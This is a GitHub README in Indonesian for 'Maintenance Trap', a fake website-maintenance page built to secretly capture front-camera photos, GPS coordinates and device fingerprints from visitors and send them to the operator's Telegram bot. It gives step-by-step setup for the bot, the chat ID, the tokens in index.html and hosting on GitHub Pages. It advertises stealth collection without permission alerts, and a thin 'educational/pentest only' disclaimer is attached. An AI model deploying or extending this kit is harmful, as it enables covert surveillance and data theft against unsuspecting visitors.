# 🔐 Maintenance Trap

<div align="center">

![GitHub](https://img.shields.io/badge/Status-Aktif-brightgreen)
![License](https://img.shields.io/badge/License-MIT-red)
![Platform](https://img.shields.io/badge/Platform-Web-blue)
![Privacy](https://img.shields.io/badge/Privacy-⚠️_Kritis-orange)

**Halaman maintenance yang diam-diam mengumpulkan intelijen perangkat**

[![Demo](https://img.shields.io/badge/🚀-Demo_Hidup-success?style=for-the-badge)](https://yourusername.github.io/maintenance-trap)
[![Deploy](https://img.shields.io/badge/⚡-Deploy_Sekarang-important?style=for-the-badge)](#-deploy-cepat)

</div>

## 🕵️‍♂️ Tentang Project

<div align="center">

![Maintenance Trap Screenshot](screenshot.jpg)

</div>

> ⚠️ **PERINGATAN**: Project ini hanya untuk tujuan edukasi dan penetration testing yang sah. Penggunaan tanpa izin sangat dilarang.

Maintenance Trap terlihat seperti halaman "sedang maintenance" yang normal, namun diam-diam mengumpulkan informasi lengkap perangkat dan mengirimkannya ke channel Telegram yang ditentukan.

## 🎯 Fitur Utama

### 🖥️ Fitur Permukaan
- **UI Maintenance Profesional** - Halaman error 503 yang meyakinkan
- **Countdown Real-time** - Timer maintenance dinamis
- **Indikator Progress** - Visual progress bar maintenance
- **Desain Responsif** - Bekerja di semua perangkat

### 🔍 Pengumpulan Intelijen
- **📸 Akses Kamera** - Pengambilan foto diam-diam dari kamera depan
- **📍 Data Lokasi** - Koordinat GPS dengan metrik akurasi
- **🖥️ Fingerprinting Perangkat** - Profil lengkap hardware/software
- **🌐 Intelijen Jaringan** - Tipe koneksi dan kemampuan
- **⏰ Analisis Perilaku** - Pola klik dan timing

### 📡 Eksfiltrasi Data
- **Integrasi Telegram** - Transmisi data aman via bot API
- **Pengiriman Dual Payload** - Laporan teks + lampiran foto
- **Operasi Stealth** - Tanpa alert izin ke user
- **Mekanisme Retry** - Koleksi data progresif tiap klik

## 🚀 Deploy Cepat

### 1. Setup Telegram Bot
```bash
# Chat dengan @BotFather di Telegram
/newbot
→ Pilih nama bot (contoh: "MaintenanceBot")
→ Pilih username (contoh: "maintenance_trap_bot")
→ Simpan token API yang diberikan
```

2. Dapatkan Chat ID

```bash
# Kirim pesan ke bot baru Anda
# Kunjungi: https://api.telegram.org/bot<TOKEN_ANDA>/getUpdates
# Cari "chat":{"id":123456789} di response
```

3. Deploy ke GitHub Pages

```bash
# Fork repository ini
# Ganti di index.html:
const TELEGRAM_BOT_TOKEN = 'TOKEN_BOT_ASLI_ANDA';
const TELEGRAM_CHAT_ID = 'CHAT_ID_ASLI_ANDA';

# Aktifkan GitHub Pages di repository settings
# Trap Anda live di: https://username.github.io/repository-name
```

📁 Struktur Project

```
maintenance-trap/
├── index.html              # File deployment utama
├── screenshot.jpg          # Screenshot project
├── README.md              # File ini
└── LICENSE               # Lisensi MIT
```

⚙️ Konfigurasi

Sesuaikan Pesan Maintenance

```html
<p class="error-message">
    Pesan maintenance custom di sini...
</p>
```

Modifikasi Pengumpulan Data

```javascript
const captureSettings = {
    photoQuality: 0.8,
    cameraTimeout: 5000,
    locationAccuracy: 'high'
};
```

📊 Data yang Dikumpulkan

Data Type Collection Method Transmission
Camera Photo getUserMedia API Telegram Photo
GPS Location Geolocation API Text Coordinates
Device Info Navigator Object Text Report
Screen Data Screen API Text Dimensions

🔧 Troubleshooting

Masalah Umum

1. Foto tidak terkirim - Check camera permissions
2. Error Telegram - Verify bot token and chat ID
3. Lokasi gagal - Ensure HTTPS deployment
4. CORS issues - Deploy on proper web server

Debug Mode

```javascript
const DEBUG = true;
```

📜 Legal & Etika

✅ PENGGUNAAN YANG DIIZINKAN

· Penetration testing berizin
· Research keamanan dengan persetujuan
· Demo edukasi

❌ PENGGUNAAN YANG DILARANG

· Surveillance tanpa izin
· Koleksi data illegal
· Aktivitas malicious

📄 Lisensi

Distributed under the MIT License. See LICENSE for more information.

👥 Author

· JhingShaw

---

<div align="center">

⚠️ GUNAKAN DENGAN TANGGUNG JAWAB ⚠️

© 2025 JhingShaw - All rights reserved

</div>
